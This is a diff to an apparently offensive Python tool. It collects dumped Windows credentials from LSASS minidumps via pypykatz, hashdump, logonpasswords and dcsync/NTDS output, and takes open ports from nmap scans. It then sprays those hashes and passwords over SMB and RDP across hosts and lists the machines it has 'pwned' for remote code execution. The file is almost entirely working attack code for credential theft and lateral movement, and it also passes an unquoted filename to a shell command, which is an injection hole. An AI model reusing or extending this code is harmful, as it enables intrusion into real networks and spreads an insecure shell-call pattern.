@@ -1,9 +1,14 @@
 #!/usr/bin/python3
 import os
 import re
+import io
 import sys
+import pdb
+import json
 import argparse
+import subprocess
 import pandas as pd
+from lxml import etree
 from termcolor import cprint
 from tabulate import tabulate
 
@@ -12,6 +17,7 @@ import nthash
 class Manager:
     FILE = None
     cols = []
+    dtype = {}
 
     def __init__(self):
         self.modified = False
@@ -19,10 +25,10 @@ class Manager:
             raise NotImplementedError
         if os.path.exists(self.FILE):
             #print('[+] Load existing file')
-            self.df = pd.read_csv(self.FILE, usecols=self.cols, na_filter=False)
+            self.df = pd.read_csv(self.FILE, usecols=self.cols, dtype=self.dtype, na_filter=False)
         else:
             #print('[-] Create for you')
-            self.df = pd.DataFrame([], columns=self.cols, dtype=str)
+            self.df = pd.DataFrame([], columns=self.cols, dtype=self.dtype)
             self.modified = True
             self.export()
         self.init()
@@ -48,6 +54,12 @@ class Manager:
 class CredManager(Manager):
     FILE = 'credential.csv'
     cols = ['User', 'Pass', 'NTLM', 'Domain']
+    dtype = {
+        'User': str, 
+        'Pass': str, 
+        'NTLM': str, 
+        'Domain': str
+    }
 
     def init(self):
         changed = False
@@ -79,22 +91,54 @@ class CredManager(Manager):
 class HostManager(Manager):
     FILE = 'host.csv'
     cols = ['IP', 'HOST', 'Ports']
+    dtype = {
+        'IP': str, 
+        'HOST': str, 
+        'Ports': str, 
+    }
 
-    def add(self, ip, host=None):
+    def merge_ports(self, _a, _b):
+        return ' '.join(set(_a.split(' ')).union(set(_b.split(' '))))
+
+    def add(self, ip, host=None, ports=None):
         # check exists
         if (self.df['IP'] == ip).any():
             for i in self.df.index[self.df['IP'] == ip].tolist():
-                if host and self.df.iloc[i]['HOST'] is None:
+                if host:
                     self.modified = True
                     self.df.at[i, 'HOST'] = host
+                if ports:
+                    self.modified = True
+                    self.df.at[i, 'Ports'] = self.merge_ports(self.df.at[i, 'Ports'], ports)
             return
         
         self.modified = True
-        self.df = self.df.append(dict(IP=ip, HOST=host), ignore_index=True)
+        self.df = self.df.append(dict(IP=ip, HOST=host, Ports=ports), ignore_index=True)
+
+    def import_file(self, filename):
+        # nmap -p80,443,445 -v -Pn -oX portscan.txt -iL host
+        rt = etree.parse(filename)
+        for host in rt.xpath('//host'):
+            ip = host.xpath('.//address')[0].get('addr')
+            _host = None
+            for hostnametag in host.xpath('.//hostname[@name]'):
+                _host = hostnametag.get('name')
+            _ports = ' '.join([x.get('portid') for x in host.xpath('.//port[./state[@state="open"]]')])
+            self.add(ip, _host, _ports)
+        self.export()
 
 class RecordManager(Manager):
     FILE = 'record.csv'
     cols = ['IP', 'User', 'Pass', 'NTLM', 'Domain', 'Protocol', 'Status']
+    dtype = {
+        'IP': str, 
+        'User': str, 
+        'Pass': str, 
+        'NTLM': str, 
+        'Domain': str, 
+        'Protocol': str, 
+        'Status': int, 
+    }
 
     def add(self, item):
         if self.exists(item[:-1]):
@@ -107,18 +151,34 @@ class RecordManager(Manager):
             for i, val in enumerate(item):
                 eq &= val == data[self.cols[i]]
             if eq:
-                print(item)
-                print('[~] Skip tried combination')
+                #print(item)
+                #print('[~] Skip tried combination')
                 return True
         return False
-    def canExec(self):
+    def canExec(self, ip=None, adminOnly=False, display=False):
+        _df = pd.DataFrame(self.df[self.df['User'].apply(lambda x: not x.endswith('$'))], columns=self.cols)
         # cme smb pwned
-        pwn_cme = self.df[(self.df['Protocol'] == 'cme-smb') & (self.df['Status'] == 2)]
-        pwn_rdp = self.df[(self.df['Protocol'] == 'rdp') & (self.df['Status'] == 1)]
+        pwn_cme = _df[(_df['Protocol'] == 'cme-smb') & (_df['Status'] == 2)]
+        pwn_rdp = _df[(_df['Protocol'] == 'rdp') & (_df['Status'] == 1)]
+        pwn_rdp = pwn_rdp.assign(NTLM='')
+
         # sam, lsa, dcsync pwned
-        pwn_local = self.df[self.df['Protocol'] == 'localdump']
-        pwndf = pd.concat([pwn_cme, pwn_rdp, pwn_local])
-        print(pwndf)
+        pwn_dump = _df[_df['Protocol'] == 'localdump']
+        pwn_dumpadm = pwn_dump[(pwn_dump['Domain'] == '.') & (pwn_dump['User'] == 'Administrator')]
+        pwn_dumpdu = pwn_dump[pwn_dump['Domain'] != '.']
+
+        if adminOnly:
+            pwndf = pd.concat([pwn_cme, pwn_dumpadm])
+        else:
+            pwndf = pd.concat([pwn_cme, pwn_rdp, pwn_dumpadm, pwn_dumpdu])
+        if ip is not None:
+            pwndf = pwndf[pwndf['IP'] == ip]
+        pwndf = pwndf.reset_index(drop=True)
+
+        if display:
+            print(tabulate(pwndf, headers='keys', tablefmt='psql'))
+
+        return pwndf
 
 def highlight(s, level=0):
     if level >= 2:
@@ -132,9 +192,10 @@ def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('--cme', action='store_true')
     parser.add_argument('--rdp', action='store_true')
-    parser.add_argument('--import-sam', dest='_sam')
     parser.add_argument('--import-lsa', dest='_lsa')
     parser.add_argument('--import-ntds', dest='_ntds')
+    parser.add_argument('--import-mini', dest='_minidump')
+    parser.add_argument('--import-nmap', dest='_nmapXml')
     parser.add_argument('-t', '--itarget-ip', dest='itarget_ip', help='must be IPv4 format')
     parser.add_argument('-T', '--itarget-name', dest='itarget_name')
     parser.add_argument('--reset', action='store_true')
@@ -159,7 +220,7 @@ cm = CredManager()
 hm = HostManager()
 rm = RecordManager()
 
-if args._sam or args._lsa or args._ntds:
+if args._lsa or args._ntds or args._minidump:
     if args.itarget_ip is None:
         print('Please specify import target with `-t <ip>`')
         exit(0)
@@ -169,27 +230,44 @@ if args._sam or args._lsa or args._ntds:
         print(rm)
     hm.add(args.itarget_ip, args.itarget_name)
 
-if args._sam:
-    print('Parsing `hashdump`(--sam) result')
-    with open(args._sam) as f:
-        for line in f:
-            m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
-            _domain, _user, _ntlm = '.', m.group(1), m.group(2)
+if args._nmapXml:
+    hm.import_file(args._nmapXml)
+
+if args._minidump:
+    print('Parsing `procdump`(--mini) result')
+    pdump = subprocess.check_output('pypykatz lsa --json minidump "%s"' % args._minidump, shell=True).decode()
+    pdump = json.loads(pdump)
+    #df = pd.read_csv(io.StringIO(pdump), sep=':')
+    pdump = next(iter(pdump.values()))
+    for k, v in pdump['logon_sessions'].items():
+        #pdb.set_trace()
+        logon = v['logon_server']
+        for msv in v['msv_creds']:
+            if logon == msv['domainname']: # local
+                _domain = '.'
+            else: # domain
+                _domain = msv['domainname']
+            _user = msv['username']
+            _ntlm = msv['NThash']
+
             cm.addH(_domain, _user, _ntlm)
             rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 0))
-        cm.export()
-
+    cm.export()
 
 if args._lsa:
     print('Parsing `logonpasswords`(--lsa) result')
     builtinkeys = ['dpapi_machinekey', 'dpapi_userkey', 'NL$KM']
     with open(args._lsa) as f:
         for line in f:
+            line = line.strip()
             m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
             if m is not None:
                 _domain, _user, _ntlm = '.', m.group(1), m.group(2)
                 if '\\' in _user:
                     _domain, _user = _user.split('\\', 1)
+                elif _user in ['WDAGUtilityAccount', 'DefaultAccount', 'Guest']:
+                    continue
+
                 cm.addH(_domain, _user, _ntlm)
                 rm.add((args.itarget_ip, _user, '', _ntlm, _domain, 'localdump', 1))
             if line.count(':') == 1: # clear-text password
@@ -209,6 +287,7 @@ if args._ntds:
     print('Parsing `dcsync`(--ntds) result')
     with open(args._ntds) as f:
         for line in f:
+            line = line.strip()
             m = re.match(r'([^:]+):\d+:[0-9a-f]{32}:([0-9a-f]{32}):::', line)
             _domain, _user, _ntlm = '.', m.group(1), m.group(2)
             if '\\' in _user:
@@ -219,14 +298,17 @@ if args._ntds:
 
 print(cm)
 print(hm)
-print(rm)
-print(rm.canExec())
+print('\n==== RCE machines ====')
+rm.canExec(display=True)
+print('======================')
 
 if args.cme:
     import cmecheck
     proto = 'cme-smb'
     for ip, host, portsS in hm.list():
         ports = portsS.split(' ')
+        if len(rm.canExec(ip=ip, adminOnly=True)) > 0: # skip pwned machine
+            continue
         if '445' not in ports:
             continue
         isInternal = ip.startswith('172')
@@ -236,22 +318,30 @@ if args.cme:
             status = cmecheck.run(ip, username=u, password=p, ntlm=n, domain=d, useProxy=isInternal)
             rm.add((ip, u, p, n, d, proto, status))
             d = d or '.'
+            c = p or n
             if status == 2:
-                highlight('[+][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip), 2)
+                highlight('[+][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, c, ip), 2)
+                break
             elif status == 1:
-                highlight('[|][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip), 1)
+                highlight('[|][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, c, ip), 1)
             elif status == 0:
-                print('[-][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, p, ip))
+                print('[-][cme] ("%s\\%s", "%s") @ "%s"' % (d, u, c, ip))
 
 if args.rdp:
     import rdpcheck
     proto = 'rdp'
     for ip, host, portsS in hm.list():
         ports = portsS.split(' ')
+        if len(rm.canExec(ip=ip, adminOnly=True)) > 0: # skip pwned machine
+            continue
         if '3389' not in ports:
             continue
         isInternal = ip.startswith('172')
-        for u, p, _, d in cm.list(True):
+        for u, p, _, d in cm.list():
+            #if d and not p: # preserve local user(?) only
+            #    continue
+            if not p:
+                continue
             if rm.exists((ip, u, p, _, d, proto)):
                 continue
             status = rdpcheck.run(ip, username=u, password=p, domain=d, useProxy=isInternal)
